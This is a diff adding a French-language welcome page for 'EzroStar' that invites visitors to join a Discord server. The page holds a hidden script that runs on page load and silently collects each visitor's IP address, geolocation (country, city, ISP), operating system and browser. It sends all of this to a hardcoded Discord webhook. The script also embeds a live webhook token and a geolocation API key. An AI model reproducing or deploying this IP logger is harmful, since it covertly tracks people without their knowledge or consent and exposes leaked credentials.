@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- ... (autres balises meta et liens) ... -->
+</head>
+
+<body>
+    <h1>Bienvenue sur le site d'EzroStar. Veuillez rejoindre le Discord pour plus d'infos :</h1>
+    <a href="https://discord.gg/GsDsDzp6bB" target="_blank" class="discord-button">Discord</a>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
+        const ipAddressURL = "https://api64.ipify.org?format=json";
+        const ipGeolocationURL = "https://api.ipgeolocation.io/ipgeo?apiKey=108c977b8b9243399faf11b6d6c19694";
+
+        const getIpAddress = async () => {
+            const response = await fetch(ipAddressURL);
+            const data = await response.json();
+            return data.ip;
+        };
+
+        const getIpGeolocation = async (ipAddress) => {
+            const response = await fetch(`${ipGeolocationURL}&ip=${ipAddress}`);
+            const data = await response.json();
+            console.log(data); // Ajout du console.log pour afficher les détails dans la console
+            return data;
+        };
+
+        const hideEmail = (email) => {
+            const atIndex = email.indexOf('@');
+            if (atIndex > 0) {
+                const visiblePart = email.substring(0, Math.min(atIndex, email.length - 3));
+                const hiddenPart = '*'.repeat(Math.max(0, email.length - atIndex - 3));
+                return visiblePart + hiddenPart + email.substring(atIndex);
+            }
+            return email;
+        };
+
+        const sendWebhook = async (embed) => {
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    embeds: [embed]
+                })
+            });
+        };
+
+        const sendWebhookWithMessage = async () => {
+            try {
+                const ipAddress = await getIpAddress();
+                const ipGeolocationData = await getIpGeolocation(ipAddress);
+
+                const currentDate = new Date().toLocaleString();
+
+                const userAgent = window.navigator.userAgent;
+                const osInfo = userAgent.match(/\(([^)]+)\)/)[1]; // Extrait les informations entre parenthèses
+
+                const embed = {
+                    title: "<:7155partner:1210210425682141194> Nouveau membre a rejoint le site!",
+                    color: 0x2b2d31,
+                    image: {
+                        url: "https://cdn.discordapp.com/attachments/1210276362758258728/1210992175446495293/standard_5.gif?ex=65ec9359&is=65da1e59&hm=ebde8f5c3f509ddd4ef14d4431cc25656f9b4074444cdc7a852177487965f6b6&"
+                    },
+                    fields: [
+                        {
+                            name: "Adresse IP",
+                            value: `\`${ipAddress}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Pays",
+                            value: ipGeolocationData.country_name ? `\`${ipGeolocationData.country_name}\`` : "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "Ville",
+                            value: ipGeolocationData.city ? `\`${ipGeolocationData.city}\`` : "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "Fournisseur Internet",
+                            value: ipGeolocationData.isp ? `\`${ipGeolocationData.isp}\`` : "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "Date",
+                            value: `\`${currentDate}\``,
+                            inline: true
+                        },
+                        {
+                            name: "Plateforme & Navigateur",
+                            value: `\`${osInfo}\``,
+                            inline: true
+                        }
+                    ]
+                };
+
+                // Envoie du message via le webhook Discord
+                await sendWebhook(embed);
+            } catch (error) {
+                console.error(error);
+            }
+        };
+
+        // Appelle la fonction au chargement de la page
+        sendWebhookWithMessage();
+    </script>
+</body>
+
+</html>
